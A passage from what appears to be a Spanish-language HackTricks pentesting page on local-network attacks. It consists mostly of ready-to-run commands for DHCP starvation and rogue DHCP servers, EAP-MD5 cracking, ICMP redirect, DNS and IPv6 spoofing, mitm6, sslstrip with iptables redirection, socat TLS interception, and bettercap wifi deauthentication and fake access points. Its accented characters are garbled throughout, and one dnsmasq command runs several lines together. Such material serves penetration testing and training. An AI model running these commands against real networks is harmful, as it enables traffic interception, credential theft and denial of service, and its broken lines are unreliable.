Este ataque funcionar√° solo si puedes ver las respuestas del servidor DHCP y completar el protocolo (**Discover** (Comp) --> **Offer** (servidor) --> **Request** (Comp) --> **ACK** (servidor)). Por ejemplo, esto **no es posible en redes Wifi**.

Otra forma de realizar un DoS de DHCP es enviar un **paquete DHCP-RELEASE utilizando como c√≥digo fuente cada IP posible**. Entonces, el servidor pensar√° que todos han terminado de usar la IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Una forma m√°s autom√°tica de hacer esto es utilizando la herramienta [DHCPing](https://github.com/kamorin/DHCPig)

Podr√≠as usar los ataques DoS mencionados para forzar a los clientes a obtener nuevos arrendamientos dentro del entorno y agotar los servidores leg√≠timos para que se vuelvan inoperantes. As√≠ que cuando los leg√≠timos intenten reconectarse, **puedes servir valores maliciosos mencionados en el siguiente ataque**.

#### Establecer valores maliciosos

Se puede configurar un servidor DHCP malicioso utilizando el script DHCP ubicado en `/usr/share/responder/DHCP.py`. Esto es √∫til para ataques de red, como capturar tr√°fico HTTP y credenciales, redirigiendo el tr√°fico a un servidor malicioso. Sin embargo, establecer una puerta de enlace maliciosa es menos efectivo ya que solo permite capturar tr√°fico saliente del cliente, perdiendo las respuestas de la puerta de enlace real. En su lugar, se recomienda configurar un servidor DNS o WPAD malicioso para un ataque m√°s efectivo.

A continuaci√≥n se presentan las opciones de comando para configurar el servidor DHCP malicioso:

* **Nuestra direcci√≥n IP (Anuncio de puerta de enlace)**: Usa `-i 10.0.0.100` para anunciar la IP de tu m√°quina como la puerta de enlace.
* **Nombre de dominio DNS local**: Opcionalmente, usa `-d example.org` para establecer un nombre de dominio DNS local.
* **IP del router/puerta de enlace original**: Usa `-r 10.0.0.1` para especificar la direcci√≥n IP del router o puerta de enlace leg√≠tima.
* **IP del servidor DNS primario**: Usa `-p 10.0.0.100` para establecer la direcci√≥n IP del servidor DNS malicioso que controlas.
* **IP del servidor DNS secundario**: Opcionalmente, usa `-s 10.0.0.1` para establecer una IP de servidor DNS secundario.
* **M√°scara de red de la red local**: Usa `-n 255.255.255.0` para definir la m√°scara de red para la red local.
* **Interfaz para tr√°fico DHCP**: Usa `-I eth1` para escuchar el tr√°fico DHCP en una interfaz de red espec√≠fica.
* **Direcci√≥n de configuraci√≥n WPAD**: Usa `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù` para establecer la direcci√≥n para la configuraci√≥n WPAD, ayudando en la interceptaci√≥n de tr√°fico web.
* **Suplantar la IP de la puerta de enlace predeterminada**: Incluye `-S` para suplantar la direcci√≥n IP de la puerta de enlace predeterminada.
* **Responder a todas las solicitudes DHCP**: Incluye `-R` para hacer que el servidor responda a todas las solicitudes DHCP, pero ten en cuenta que esto es ruidoso y puede ser detectado.

Al usar correctamente estas opciones, se puede establecer un servidor DHCP malicioso para interceptar el tr√°fico de red de manera efectiva.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataques EAP**

Aqu√≠ hay algunas de las t√°cticas de ataque que se pueden utilizar contra implementaciones de 802.1X:

* Fuerza bruta activa de contrase√±as a trav√©s de EAP
* Ataque al servidor RADIUS con contenido EAP malformado _\*\*_(exploits)
* Captura de mensajes EAP y cracking de contrase√±as offline (EAP-MD5 y PEAP)
* Forzar la autenticaci√≥n EAP-MD5 para eludir la validaci√≥n del certificado TLS
* Inyectar tr√°fico de red malicioso al autenticar utilizando un hub o similar

Si el atacante est√° entre la v√≠ctima y el servidor de autenticaci√≥n, podr√≠a intentar degradar (si es necesario) el protocolo de autenticaci√≥n a EAP-MD5 y capturar el intento de autenticaci√≥n. Luego, podr√≠a realizar fuerza bruta utilizando:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) es una clase de protocolos de red dise√±ados para **crear un sistema de enrutamiento redundante en caliente**. Con FHRP, los enrutadores f√≠sicos pueden combinarse en un solo dispositivo l√≥gico, lo que aumenta la tolerancia a fallos y ayuda a distribuir la carga.

**Los ingenieros de Cisco Systems han desarrollado dos protocolos FHRP, GLBP y HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Se conocen tres versiones del Protocolo de Informaci√≥n de Enrutamiento (RIP): RIP, RIPv2 y RIPng. Los datagramas se env√≠an a los pares a trav√©s del puerto 520 utilizando UDP por RIP y RIPv2, mientras que los datagramas se transmiten al puerto UDP 521 a trav√©s de multicast IPv6 por RIPng. El soporte para la autenticaci√≥n MD5 fue introducido por RIPv2. Por otro lado, la autenticaci√≥n nativa no est√° incorporada por RIPng; en su lugar, se conf√≠a en encabezados opcionales de IPsec AH y ESP dentro de IPv6.

* **RIP y RIPv2:** La comunicaci√≥n se realiza a trav√©s de datagramas UDP en el puerto 520.
* **RIPng:** Utiliza el puerto UDP 521 para transmitir datagramas a trav√©s de multicast IPv6.

Tenga en cuenta que RIPv2 admite autenticaci√≥n MD5 mientras que RIPng no incluye autenticaci√≥n nativa, confiando en encabezados IPsec AH y ESP en IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** es un protocolo de enrutamiento din√°mico. **Es un protocolo de vector de distancia.** Si no hay **autenticaci√≥n** y configuraci√≥n de interfaces pasivas, un **intruso** puede interferir con el enrutamiento de EIGRP y causar **envenenamiento de tablas de enrutamiento**. Adem√°s, la red EIGRP (en otras palabras, el sistema aut√≥nomo) **es plana y no tiene segmentaci√≥n en zonas**. Si un **atacante inyecta una ruta**, es probable que esta ruta **se propague** por todo el sistema EIGRP aut√≥nomo.

Atacar un sistema EIGRP requiere **establecer un vecindario con un enrutador EIGRP leg√≠timo**, lo que abre muchas posibilidades, desde reconocimiento b√°sico hasta diversas inyecciones.

[**FRRouting**](https://frrouting.org/) le permite implementar **un enrutador virtual que admite BGP, OSPF, EIGRP, RIP y otros protocolos.** Todo lo que necesita hacer es desplegarlo en el sistema de su atacante y puede pretender ser un enrutador leg√≠timo en el dominio de enrutamiento.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) tiene capacidades para interceptar transmisiones EIGRP (Enhanced Interior Gateway Routing Protocol). Tambi√©n permite la inyecci√≥n de paquetes, que pueden ser utilizados para alterar configuraciones de enrutamiento.

### OSPF

En el protocolo Open Shortest Path First (OSPF) **la autenticaci√≥n MD5 se emplea com√∫nmente para asegurar la comunicaci√≥n entre enrutadores**. Sin embargo, esta medida de seguridad puede ser comprometida utilizando herramientas como Loki y John the Ripper. Estas herramientas son capaces de capturar y descifrar hashes MD5, exponiendo la clave de autenticaci√≥n. Una vez que se obtiene esta clave, se puede utilizar para introducir nueva informaci√≥n de enrutamiento. Para configurar los par√°metros de ruta y establecer la clave comprometida, se utilizan las pesta√±as _Inyecci√≥n_ y _Conexi√≥n_, respectivamente.

* **Capturando y Descifrando Hashes MD5:** Herramientas como Loki y John the Ripper se utilizan para este prop√≥sito.
* **Configurando Par√°metros de Ruta:** Esto se realiza a trav√©s de la pesta√±a _Inyecci√≥n_.
* **Estableciendo la Clave Comprometida:** La clave se configura en la pesta√±a _Conexi√≥n_.

### Other Generic Tools & Sources

* [**Above**](https://github.com/c4s73r/Above): Herramienta para escanear el tr√°fico de red y encontrar vulnerabilidades
* Puede encontrar **m√°s informaci√≥n sobre ataques de red** [**aqu√≠**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

El atacante configura todos los par√°metros de red (GW, IP, DNS) del nuevo miembro de la red enviando respuestas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Consulta la [secci√≥n anterior](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste en enviar un paquete ICMP tipo 1 c√≥digo 5 que indica que el atacante es la mejor manera de alcanzar una IP. Luego, cuando la v√≠ctima quiera contactar la IP, enviar√° el paquete a trav√©s del atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

El atacante resolver√° algunos (o todos) los dominios que la v√≠ctima solicite.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar propio DNS con dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Puertas de enlace locales

A menudo existen m√∫ltiples rutas hacia sistemas y redes. Al crear una lista de direcciones MAC dentro de la red local, utiliza _gateway-finder.py_ para identificar hosts que soportan el reenv√≠o de IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, y mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Para la resoluci√≥n de hosts locales cuando las b√∫squedas DNS no tienen √©xito, los sistemas de Microsoft dependen de **Link-Local Multicast Name Resolution (LLMNR)** y el **NetBIOS Name Service (NBT-NS)**. De manera similar, **Apple Bonjour** y las implementaciones de **Linux de configuraci√≥n cero** utilizan **Multicast DNS (mDNS)** para descubrir sistemas dentro de una red. Debido a la naturaleza no autenticada de estos protocolos y su operaci√≥n sobre UDP, transmitiendo mensajes, pueden ser explotados por atacantes que buscan redirigir a los usuarios a servicios maliciosos.

Puedes suplantar servicios que son buscados por hosts utilizando Responder para enviar respuestas falsas.\
Lee aqu√≠ m√°s informaci√≥n sobre [c√≥mo suplantar servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Los navegadores com√∫nmente emplean el **protocolo Web Proxy Auto-Discovery (WPAD) para adquirir autom√°ticamente configuraciones de proxy**. Esto implica obtener detalles de configuraci√≥n de un servidor, espec√≠ficamente a trav√©s de una URL como "http://wpad.example.org/wpad.dat". El descubrimiento de este servidor por los clientes puede ocurrir a trav√©s de varios mecanismos:

* A trav√©s de **DHCP**, donde el descubrimiento se facilita utilizando una entrada de c√≥digo especial 252.
* Por **DNS**, que implica buscar un nombre de host etiquetado como _wpad_ dentro del dominio local.
* A trav√©s de **Microsoft LLMNR y NBT-NS**, que son mecanismos de respaldo utilizados en casos donde las b√∫squedas DNS no tienen √©xito.

La herramienta Responder aprovecha este protocolo actuando como un **servidor WPAD malicioso**. Utiliza DHCP, DNS, LLMNR y NBT-NS para enga√±ar a los clientes y hacer que se conecten a √©l. Para profundizar en c√≥mo se pueden suplantar servicios utilizando Responder [verifica esto](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP y dispositivos UPnP](spoofing-ssdp-and-upnp-devices.md)

Puedes ofrecer diferentes servicios en la red para intentar **enga√±ar a un usuario** para que ingrese algunas **credenciales en texto plano**. **M√°s informaci√≥n sobre este ataque en** [**Spoofing SSDP y Dispositivos UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Spoofing de Vecinos IPv6

Este ataque es muy similar al Spoofing ARP pero en el mundo IPv6. Puedes hacer que la v√≠ctima piense que el IPv6 del GW tiene la MAC del atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Algunos sistemas operativos configuran por defecto la puerta de enlace a partir de los paquetes RA enviados en la red. Para declarar al atacante como router IPv6, puedes usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Suplantaci√≥n de DHCP IPv6

Por defecto, algunos sistemas operativos intentan configurar el DNS leyendo un paquete DHCPv6 en la red. Entonces, un atacante podr√≠a enviar un paquete DHCPv6 para configurarse a s√≠ mismo como DNS. El DHCP tambi√©n proporciona una IPv6 a la v√≠ctima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (p√°gina falsa e inyecci√≥n de c√≥digo JS)

## Ataques a Internet

### sslStrip

B√°sicamente, lo que hace este ataque es que, en caso de que el **usuario** intente **acceder** a una p√°gina **HTTP** que est√° **redireccionando** a la versi√≥n **HTTPS**. **sslStrip** **mantendr√°** una **conexi√≥n HTTP con** el **cliente y** una **conexi√≥n HTTPS con** el **servidor** para que pueda **esnifar** la conexi√≥n en **texto plano**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
M√°s informaci√≥n [aqu√≠](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ y dns2proxy para eludir HSTS

La **diferencia** entre **sslStrip+ y dns2proxy** contra **sslStrip** es que **redirigir√°n** por ejemplo _**www.facebook.com**_ **a** _**wwww.facebook.com**_ (note la **extra** "**w**") y establecer√°n la **direcci√≥n de este dominio como la IP del atacante**. De esta manera, el **cliente** se **conectar√°** a _**wwww.facebook.com**_ **(el atacante)** pero tras bambalinas **sslstrip+** **mantendr√°** la **conexi√≥n real** a trav√©s de https con **www.facebook.com**.

El **objetivo** de esta t√©cnica es **evitar HSTS** porque _**wwww**.facebook.com_ **no ser√°** guardado en la **cach√©** del navegador, por lo que el navegador ser√° enga√±ado para realizar **la autenticaci√≥n de facebook en HTTP**.\
Tenga en cuenta que para realizar este ataque la v√≠ctima debe intentar acceder inicialmente a [http://www.faceook.com](http://www.faceook.com) y no a https. Esto se puede hacer modificando los enlaces dentro de una p√°gina http.

M√°s informaci√≥n [aqu√≠](https://www.bettercap.org/legacy/#hsts-bypass), [aqu√≠](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) y [aqu√≠](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip o sslStrip+ ya no funcionan. Esto se debe a que hay reglas HSTS preguardadas en los navegadores, por lo que incluso si es la primera vez que un usuario accede a un dominio "importante", lo har√° a trav√©s de HTTPS. Adem√°s, tenga en cuenta que las reglas preguardadas y otras reglas generadas pueden usar la bandera** [**`includeSubdomains`**](https://hstspreload.appspot.com) **por lo que el** _**wwww.facebook.com**_ **ejemplo de antes ya no funcionar√° ya que** _**facebook.com**_ **usa HSTS con `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP escucha en el puerto
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL escuchar en el puerto

#### Generar claves y certificado autofirmado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escuchar usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escuchar usando certificado y redirigir a los hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A veces, si el cliente verifica que la CA es v√°lida, podr√≠as **servir un certificado de otro nombre de host firmado por una CA**.\
Otra prueba interesante es servir un **certificado del nombre de host solicitado pero autofirmado**.

Otras cosas a probar son intentar firmar el certificado con un certificado v√°lido que no sea una CA v√°lida. O usar la clave p√∫blica v√°lida, forzar el uso de un algoritmo como Diffie-Hellman (uno que no necesite descifrar nada con la verdadera clave privada) y cuando el cliente solicite una prueba de la verdadera clave privada (como un hash) enviar una prueba falsa y esperar que el cliente no verifique esto.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

Tenga en cuenta que cuando se env√≠a un paquete UDP a un dispositivo que no tiene el puerto solicitado, se env√≠a un ICMP (Puerto Inalcanzable).

### **ARP discover**

Los paquetes ARP se utilizan para descubrir qu√© IPs se est√°n utilizando dentro de la red. La PC tiene que enviar una solicitud para cada posible direcci√≥n IP y solo las que est√°n en uso responder√°n.

### **mDNS (multicast DNS)**

Bettercap env√≠a una solicitud MDNS (cada X ms) pidiendo **\_services\_.dns-sd.\_udp.local**; la m√°quina que ve este paquete generalmente responde a esta solicitud. Luego, solo busca m√°quinas que respondan a "services".

**Tools**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap transmite paquetes al puerto 137/UDP pidiendo el nombre "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap transmite paquetes SSDP buscando todo tipo de servicios (Puerto UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap transmite paquetes WSD buscando servicios (Puerto UDP 3702).

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **reg√≠strate** en **Intigriti**, una **plataforma de recompensas por errores creada por hackers, para hackers**! √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
